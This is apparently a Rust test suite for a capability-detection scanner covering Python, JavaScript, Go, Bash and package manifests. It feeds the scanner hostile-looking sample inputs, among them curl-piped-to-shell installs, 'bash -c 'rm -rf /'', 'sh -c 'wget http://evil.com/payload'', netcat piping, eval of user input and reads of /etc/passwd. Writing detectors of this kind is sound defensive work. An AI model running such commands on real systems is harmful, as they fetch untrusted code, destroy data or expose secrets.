use std::path::Path;

use pedant_lang::{analyze_file, analyze_manifest};
use pedant_types::{Capability, ExecutionContext, Language};

fn caps_for(source: &str, path: &str, lang: Language) -> Box<[Capability]> {
    let profile = analyze_file(Path::new(path), source, lang);
    let mut caps: Vec<Capability> = profile.findings.iter().map(|f| f.capability).collect();
    caps.sort();
    caps.dedup();
    caps.into_boxed_slice()
}

fn py_caps(source: &str) -> Box<[Capability]> {
    caps_for(source, "test.py", Language::Python)
}

fn js_caps(source: &str) -> Box<[Capability]> {
    caps_for(source, "test.js", Language::JavaScript)
}

fn go_caps(source: &str) -> Box<[Capability]> {
    caps_for(source, "test.go", Language::Go)
}

fn bash_caps(source: &str) -> Box<[Capability]> {
    caps_for(source, "test.sh", Language::Bash)
}

fn has_py_cap(source: &str, expected: Capability) -> bool {
    py_caps(source).contains(&expected)
}

// ── Python tests (from Step 2) ──────────────────────────────────────────

// 2.T2
#[test]
fn python_network_import_detected() {
    assert!(
        has_py_cap(
            "import requests\nrequests.get('https://example.com')",
            Capability::Network
        ),
        "requests import should detect Network capability"
    );
}

// 2.T3
#[test]
fn python_subprocess_detected() {
    assert!(
        has_py_cap(
            "import subprocess\nsubprocess.run(['ls'])",
            Capability::ProcessExec
        ),
        "subprocess import should detect ProcessExec capability"
    );
}

// 2.T4
#[test]
fn python_crypto_detected() {
    assert!(
        has_py_cap("from cryptography.fernet import Fernet", Capability::Crypto),
        "cryptography import should detect Crypto capability"
    );
}

// 2.T5
#[test]
fn python_env_access_detected() {
    assert!(
        has_py_cap("import os\nos.getenv('SECRET')", Capability::EnvAccess),
        "os.getenv call should detect EnvAccess capability"
    );
}

// 2.T6
#[test]
fn python_filesystem_detected() {
    assert!(
        has_py_cap("f = open('/etc/passwd', 'r')", Capability::FileRead),
        "open() call should detect FileRead capability"
    );
}

// 2.T7
#[test]
fn python_ffi_detected() {
    assert!(
        has_py_cap("import ctypes", Capability::Ffi),
        "ctypes import should detect Ffi capability"
    );
}

// 2.T8
#[test]
fn python_clean_no_capabilities() {
    let caps = py_caps("x = 1 + 2\nprint(x)");
    assert!(
        caps.is_empty(),
        "clean Python should have no capabilities, got: {caps:?}"
    );
}

// 2.T9
#[test]
fn python_multiple_capabilities() {
    let caps = py_caps(
        "import requests\nfrom cryptography.fernet import Fernet\nimport os\nos.getenv('KEY')",
    );
    assert!(caps.contains(&Capability::Network), "should have Network");
    assert!(caps.contains(&Capability::Crypto), "should have Crypto");
    assert!(
        caps.contains(&Capability::EnvAccess),
        "should have EnvAccess"
    );
}

// Additional: string literal scanning
#[test]
fn python_endpoint_in_string_detected() {
    assert!(
        has_py_cap(
            "url = 'https://api.example.com/v1/data'",
            Capability::Network
        ),
        "URL string literal should detect Network capability"
    );
}

#[test]
fn python_pem_in_string_detected() {
    assert!(
        has_py_cap(
            "cert = '-----BEGIN CERTIFICATE-----\\nMIIBxTCC...'",
            Capability::Crypto
        ),
        "PEM block in string should detect Crypto capability"
    );
}

// Verify language is set on findings
#[test]
fn python_findings_have_language_set() {
    let profile = analyze_file(Path::new("test.py"), "import requests", Language::Python);
    for finding in profile.findings.iter() {
        assert_eq!(
            finding.language,
            Some(Language::Python),
            "all Python findings should have language set"
        );
    }
}

// ── JavaScript/TypeScript tests (Step 3) ────────────────────────────────

// 3.T2
#[test]
fn js_network_detected() {
    let caps = js_caps("const axios = require('axios');");
    assert!(
        caps.contains(&Capability::Network),
        "require('axios') should detect Network, got: {caps:?}"
    );
}

// 3.T3
#[test]
fn js_filesystem_detected() {
    let caps = js_caps("const fs = require('fs');");
    assert!(
        caps.contains(&Capability::FileRead),
        "require('fs') should detect FileRead, got: {caps:?}"
    );
}

// 3.T4
#[test]
fn js_process_exec_detected() {
    let caps = js_caps("const { exec } = require('child_process');");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "require('child_process') should detect ProcessExec, got: {caps:?}"
    );
}

// 3.T5
#[test]
fn ts_es_import_detected() {
    let caps = caps_for(
        "import { readFileSync } from 'fs';",
        "test.ts",
        Language::TypeScript,
    );
    assert!(
        caps.contains(&Capability::FileRead),
        "ES import of 'fs' should detect FileRead, got: {caps:?}"
    );
}

// 3.T6
#[test]
fn js_env_access_detected() {
    let caps = js_caps("const key = process.env.API_KEY;");
    assert!(
        caps.contains(&Capability::EnvAccess),
        "process.env should detect EnvAccess, got: {caps:?}"
    );
}

// 3.T7
#[test]
fn js_fetch_call_detected() {
    let caps = js_caps("fetch('https://api.example.com')");
    assert!(
        caps.contains(&Capability::Network),
        "fetch() should detect Network, got: {caps:?}"
    );
}

// 3.T14
#[test]
fn js_clean_no_capabilities() {
    let caps = js_caps("const x = 1 + 2; console.log(x);");
    assert!(
        caps.is_empty(),
        "clean JS should have no capabilities, got: {caps:?}"
    );
}

// ── Go tests (Step 3) ──────────────────────────────────────────────────

// 3.T8
#[test]
fn go_network_detected() {
    let caps = go_caps("import \"net/http\"");
    assert!(
        caps.contains(&Capability::Network),
        "import net/http should detect Network, got: {caps:?}"
    );
}

// 3.T9
#[test]
fn go_filesystem_detected() {
    let caps = go_caps("os.Open(\"/etc/passwd\")");
    assert!(
        caps.contains(&Capability::FileRead),
        "os.Open should detect FileRead, got: {caps:?}"
    );
}

// 3.T10
#[test]
fn go_exec_detected() {
    let caps = go_caps("import \"os/exec\"\nexec.Command(\"ls\")");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "os/exec import should detect ProcessExec, got: {caps:?}"
    );
}

// 3.T11
#[test]
fn go_env_detected() {
    let caps = go_caps("os.Getenv(\"SECRET\")");
    assert!(
        caps.contains(&Capability::EnvAccess),
        "os.Getenv should detect EnvAccess, got: {caps:?}"
    );
}

// 3.T12
#[test]
fn go_ffi_detected() {
    assert!(
        go_caps("import \"C\"").contains(&Capability::Ffi),
        "import C should detect Ffi"
    );
    assert!(
        go_caps("import \"unsafe\"").contains(&Capability::UnsafeCode),
        "import unsafe should detect UnsafeCode"
    );
}

// 3.T13
#[test]
fn go_os_import_without_filesystem_signal() {
    let caps = go_caps("import \"os\"\nos.Exit(1)");
    assert!(
        !caps.contains(&Capability::FileRead),
        "bare os import should not detect FileRead"
    );
    assert!(
        !caps.contains(&Capability::FileWrite),
        "bare os import should not detect FileWrite"
    );
    assert!(
        !caps.contains(&Capability::ProcessExec),
        "os.Exit should not detect ProcessExec"
    );
}

// 3.T15
#[test]
fn go_clean_no_capabilities() {
    let caps = go_caps("package main\nfunc main() { println(\"hello\") }");
    assert!(
        caps.is_empty(),
        "clean Go should have no capabilities, got: {caps:?}"
    );
}

// ── Bash tests (Step 4) ───────────────────────────────────────────────

// 4.T3
#[test]
fn bash_network_detected() {
    let caps = bash_caps("curl -s https://example.com | bash");
    assert!(
        caps.contains(&Capability::Network),
        "curl should detect Network, got: {caps:?}"
    );
}

// 4.T4
#[test]
fn bash_process_exec_detected() {
    let caps = bash_caps("eval $USER_INPUT");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "eval should detect ProcessExec, got: {caps:?}"
    );
}

// 4.T5
#[test]
fn bash_crypto_detected() {
    let caps = bash_caps("openssl enc -aes-256-cbc -in secret.txt");
    assert!(
        caps.contains(&Capability::Crypto),
        "openssl should detect Crypto, got: {caps:?}"
    );
}

// 4.T6
#[test]
fn bash_env_access_detected() {
    let caps = bash_caps("export API_KEY=abc123");
    assert!(
        caps.contains(&Capability::EnvAccess),
        "export should detect EnvAccess, got: {caps:?}"
    );
}

// 4.T7
#[test]
fn bash_cat_not_flagged() {
    let caps = bash_caps("cat README.md | head -5");
    assert!(
        caps.is_empty(),
        "cat should not produce capabilities in v1, got: {caps:?}"
    );
}

// 4.T15
#[test]
fn bash_clean_no_capabilities() {
    let caps = bash_caps("echo hello\necho world");
    assert!(
        caps.is_empty(),
        "clean Bash should have no capabilities, got: {caps:?}"
    );
}

// ── Manifest tests (Step 4) ───────────────────────────────────────────

// 4.T8
#[test]
fn package_json_postinstall_hook() {
    let source = r#"{"scripts": {"postinstall": "node setup.js"}}"#;
    let profile = analyze_manifest(Path::new("package.json"), source);
    assert!(
        !profile.findings.is_empty(),
        "postinstall hook should produce findings"
    );
    let finding = &profile.findings[0];
    assert_eq!(finding.capability, Capability::ProcessExec);
    assert_eq!(
        finding.execution_context,
        Some(ExecutionContext::InstallHook)
    );
}

// 4.T9
#[test]
fn package_json_no_hooks_clean() {
    let source = r#"{"scripts": {"start": "node index.js", "test": "jest"}}"#;
    let profile = analyze_manifest(Path::new("package.json"), source);
    assert!(
        profile.findings.is_empty(),
        "non-hook scripts should produce no findings, got: {:?}",
        profile.findings
    );
}

// 4.T10
#[test]
fn setup_py_cmdclass_hook() {
    let source = "from setuptools import setup\nsetup(name='foo', cmdclass={'build': MyBuild})";
    let profile = analyze_manifest(Path::new("setup.py"), source);
    assert!(
        !profile.findings.is_empty(),
        "cmdclass should produce findings"
    );
    let finding = &profile.findings[0];
    assert_eq!(finding.execution_context, Some(ExecutionContext::BuildHook));
}

// 4.T11
#[test]
fn pyproject_build_backend_hook() {
    let source = "[build-system]\nbuild-backend = \"custom_backend\"\nbackend-path = [\".\"]";
    let profile = analyze_manifest(Path::new("pyproject.toml"), source);
    assert!(
        !profile.findings.is_empty(),
        "custom build backend should produce findings"
    );
    let finding = &profile.findings[0];
    assert_eq!(finding.execution_context, Some(ExecutionContext::BuildHook));
}

// 4.T12
#[test]
fn go_generate_directive() {
    let source = "package main\n//go:generate stringer -type=Foo\nfunc main() {}";
    let profile = analyze_manifest(Path::new("main.go"), source);
    assert!(
        !profile.findings.is_empty(),
        "go:generate should produce findings"
    );
    let finding = &profile.findings[0];
    assert_eq!(finding.capability, Capability::ProcessExec);
    assert_eq!(finding.execution_context, Some(ExecutionContext::Generator));
}

#[test]
fn manifest_hook_detects_shared_exec_commands() {
    let source = "install:\n\teval \"$(node setup.js)\"";
    let profile = analyze_manifest(Path::new("Makefile"), source);
    let caps: Box<[Capability]> = profile
        .findings
        .iter()
        .map(|finding| finding.capability)
        .collect::<Vec<_>>()
        .into_boxed_slice();

    assert!(
        caps.contains(&Capability::ProcessExec),
        "Makefile eval/node commands should detect ProcessExec, got: {caps:?}"
    );
}

// 4.T13
#[test]
fn makefile_hook_entrypoint() {
    let source = "install:\n\tcurl -sL https://example.com/setup.sh | sh";
    let profile = analyze_manifest(Path::new("Makefile"), source);
    assert!(
        !profile.findings.is_empty(),
        "Makefile with curl should produce findings"
    );
    let finding = profile
        .findings
        .iter()
        .find(|f| f.capability == Capability::Network)
        .expect("should have Network finding");
    assert_eq!(finding.execution_context, Some(ExecutionContext::BuildHook));
}

// 4.T14
#[test]
fn justfile_hook_entrypoint() {
    let source = "setup:\n    wget https://example.com/install.sh\n    bash -c './install.sh'";
    let profile = analyze_manifest(Path::new("justfile"), source);
    let caps: Box<[Capability]> = profile
        .findings
        .iter()
        .map(|f| f.capability)
        .collect::<Vec<_>>()
        .into_boxed_slice();
    assert!(
        caps.contains(&Capability::Network),
        "justfile with wget should detect Network, got: {caps:?}"
    );
    assert!(
        caps.contains(&Capability::ProcessExec),
        "justfile with bash -c should detect ProcessExec, got: {caps:?}"
    );
    for finding in profile.findings.iter() {
        assert_eq!(
            finding.execution_context,
            Some(ExecutionContext::BuildHook),
            "all justfile findings should have BuildHook context"
        );
    }
}

// ── Tree-sitter tests (Step 7) ────────────────────────────────────────

// 7.T1
#[cfg(feature = "ts-python")]
#[test]
fn python_aliased_import_tree_sitter() {
    let caps = py_caps("import requests as r\nr.get('https://example.com')");
    assert!(
        caps.contains(&Capability::Network),
        "aliased import should detect Network via tree-sitter, got: {caps:?}"
    );
}

// 7.T2
#[cfg(feature = "ts-python")]
#[test]
fn python_multiline_import_tree_sitter() {
    let caps = py_caps("from subprocess import (\n    run,\n    Popen\n)");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "multiline import should detect ProcessExec via tree-sitter, got: {caps:?}"
    );
}

// 7.T3
#[cfg(feature = "ts-go")]
#[test]
fn go_qualified_call_tree_sitter() {
    let caps = go_caps("package main\nimport \"os\"\nfunc main() { os.Open(\"/etc/passwd\") }");
    assert!(
        caps.contains(&Capability::FileRead),
        "qualified os.Open call should detect FileRead via tree-sitter, got: {caps:?}"
    );
}

// 7.T4
#[cfg(feature = "ts-javascript")]
#[test]
fn js_dynamic_require_tree_sitter() {
    let caps = js_caps("const mod = require(`child_process`);");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "template literal require should detect ProcessExec via tree-sitter, got: {caps:?}"
    );
}

// 7.T5a
#[cfg(feature = "ts-bash")]
#[test]
fn bash_command_tree_sitter() {
    let caps = bash_caps("curl -s https://example.com | bash");
    assert!(
        caps.contains(&Capability::Network),
        "tree-sitter should detect curl as Network, got: {caps:?}"
    );
}

// 7.T5b
#[cfg(feature = "ts-bash")]
#[test]
fn bash_bash_c_tree_sitter() {
    let caps = bash_caps("bash -c 'rm -rf /'");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "tree-sitter should detect bash -c as ProcessExec, got: {caps:?}"
    );
}

// 7.T5c
#[cfg(feature = "ts-bash")]
#[test]
fn bash_export_tree_sitter() {
    let caps = bash_caps("export SECRET=abc123");
    assert!(
        caps.contains(&Capability::EnvAccess),
        "tree-sitter should detect export as EnvAccess, got: {caps:?}"
    );
}

// 7.T5d
#[cfg(feature = "ts-bash")]
#[test]
fn bash_piped_commands_tree_sitter() {
    let caps = bash_caps("echo hello | nc localhost 8080");
    assert!(
        caps.contains(&Capability::Network),
        "tree-sitter should detect nc in pipeline as Network, got: {caps:?}"
    );
}

// 7.T5e
#[cfg(feature = "ts-bash")]
#[test]
fn bash_clean_no_caps_tree_sitter() {
    let caps = bash_caps("echo hello\necho world");
    assert!(
        caps.is_empty(),
        "clean Bash should have no capabilities via tree-sitter, got: {caps:?}"
    );
}

// 7.T5f
#[cfg(feature = "ts-bash")]
#[test]
fn bash_multiple_commands_tree_sitter() {
    let caps = bash_caps("curl https://example.com\nopenssl enc -aes-256-cbc\nexport KEY=val");
    assert!(
        caps.contains(&Capability::Network),
        "should detect Network, got: {caps:?}"
    );
    assert!(
        caps.contains(&Capability::Crypto),
        "should detect Crypto, got: {caps:?}"
    );
    assert!(
        caps.contains(&Capability::EnvAccess),
        "should detect EnvAccess, got: {caps:?}"
    );
}

// 7.T5g
#[cfg(feature = "ts-bash")]
#[test]
fn bash_sh_c_tree_sitter() {
    let caps = bash_caps("sh -c 'wget http://evil.com/payload'");
    assert!(
        caps.contains(&Capability::ProcessExec),
        "tree-sitter should detect sh -c as ProcessExec, got: {caps:?}"
    );
}

// 7.T5h: bare bash without -c should not trigger ProcessExec
#[cfg(feature = "ts-bash")]
#[test]
fn bash_without_dash_c_no_process_exec() {
    let caps = bash_caps("bash script.sh");
    assert!(
        !caps.contains(&Capability::ProcessExec),
        "bash without -c should not detect ProcessExec, got: {caps:?}"
    );
}

// 7.T5: regex fallback works without tree-sitter features
#[test]
fn regex_fallback_without_feature() {
    // Standard imports should still be detected via regex tier regardless of features.
    assert!(
        has_py_cap("import requests", Capability::Network),
        "regex tier should detect Network from standard import"
    );
    let caps = js_caps("const fs = require('fs');");
    assert!(
        caps.contains(&Capability::FileRead),
        "regex tier should detect FileRead from require('fs')"
    );
    let caps = go_caps("import \"net/http\"");
    assert!(
        caps.contains(&Capability::Network),
        "regex tier should detect Network from Go import"
    );
}
